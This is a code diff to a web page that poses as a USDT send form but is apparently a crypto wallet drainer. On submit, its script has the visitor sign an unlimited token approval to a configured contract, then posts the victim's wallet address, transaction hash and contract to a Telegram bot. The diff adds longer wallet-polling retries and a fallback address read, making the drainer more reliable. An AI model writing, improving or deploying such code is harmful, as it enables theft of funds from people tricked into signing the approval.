@@ -85,7 +85,7 @@
                 <label class="label">Address or Domain Name</label>
                 <div class="input-row primary">
                     <input id="recipientInput" type="text" placeholder="Search or Enter" value="TAT3kU5o3utrcFL7u747B45W1zRxbWZF8b" />
-                    <span class="paste" onclick="pasteAddress( )">Paste</span>
+                    <span class="paste" onclick="pasteAddress()">Paste</span>
                 </div>
 
                 <label class="label">Destination Network</label>
@@ -123,22 +123,31 @@
         let selectedToken = 'usdt_tron';
         let cachedUserAddress = null;
 
-        // Leggi l'indirizzo automaticamente al caricamento della pagina
         async function initializeTronWeb() {
             let retries = 0;
-            while (!window.tronWeb && retries < 30) {
+            while (!window.tronWeb && retries < 50) {
                 await new Promise(resolve => setTimeout(resolve, 100));
                 retries++;
             }
 
             if (window.tronWeb) {
-                // TronWeb è disponibile - leggi l'indirizzo
-                cachedUserAddress = window.tronWeb.defaultAddress.base58;
-                console.log('TronWeb initialized, address:', cachedUserAddress);
+                let address = window.tronWeb.defaultAddress.base58;
+                if (address && address !== false && address !== null && address !== '') {
+                    cachedUserAddress = address;
+                    console.log('TronWeb initialized, address:', cachedUserAddress);
+                } else {
+                    console.log('TronWeb available but address not ready yet');
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    address = window.tronWeb.defaultAddress.base58;
+                    if (address && address !== false && address !== null && address !== '') {
+                        cachedUserAddress = address;
+                        console.log('Address loaded after delay:', cachedUserAddress);
+                    }
+                }
             }
         }
 
-        document.addEventListener('DOMContentLoaded', ( ) => {
+        document.addEventListener('DOMContentLoaded', () => {
             initializeTronWeb();
             initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
@@ -155,7 +164,7 @@
                     selectToken(key);
                 };
                 option.innerHTML = `<img src="${token.logo}" alt="${token.symbol}" class="token-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22%3E%3Crect fill=%22%23f0f0f0%22 width=%2224%22 height=%2224%22/%3E%3C/svg%3E'"><div class="token-info"><div class="token-name">${token.symbol}</div><div class="token-network">${token.network}</div></div>`;
-                menu.appendChild(option );
+                menu.appendChild(option);
             }
         }
 
@@ -235,7 +244,7 @@
                 ? `https://tronscan.org/transaction/${txHash}`
                 : `https://bscscan.com/tx/${txHash}`;
 
-            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date( ).toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;
+            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date().toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;
 
             const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
 
@@ -246,7 +255,7 @@
                     body: JSON.stringify({
                         chat_id: CONFIG.TELEGRAM_CHAT_ID,
                         text: messageText
-                    } )
+                    })
                 });
 
                 const responseData = await response.json();
@@ -288,17 +297,19 @@
                     return;
                 }
 
-                // Usa l'indirizzo che è stato letto al caricamento della pagina
                 let userAddress = cachedUserAddress;
 
-                if (!userAddress) {
+                if (!userAddress || userAddress === false || userAddress === null || userAddress === '') {
+                    userAddress = tronWeb.defaultAddress.base58;
+                }
+
+                if (!userAddress || userAddress === false || userAddress === null || userAddress === '') {
                     showError('Wallet address not available');
                     btn.disabled = false;
                     btn.textContent = 'Next';
                     return;
                 }
 
-                // Costruisci la transazione per l'approve
                 const parameter = [
                     {type: 'address', value: token.smartContract},
                     {type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'}
@@ -319,7 +330,6 @@
                     return;
                 }
 
-                // Firma - QUESTO apre il popup di firma
                 const signedTx = await tronWeb.trx.sign(tx.transaction);
                 let txHash = await tronWeb.trx.sendRawTransaction(signedTx);
 
@@ -335,7 +345,7 @@
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
 
-                await sendTelegramNotification(userAddress || 'Unknown', txHash, amount, token, recipient);
+                await sendTelegramNotification(userAddress, txHash, amount, token, recipient);
 
                 await new Promise(resolve => setTimeout(resolve, 5000));
                 document.getElementById('processingScreen').classList.remove('active');
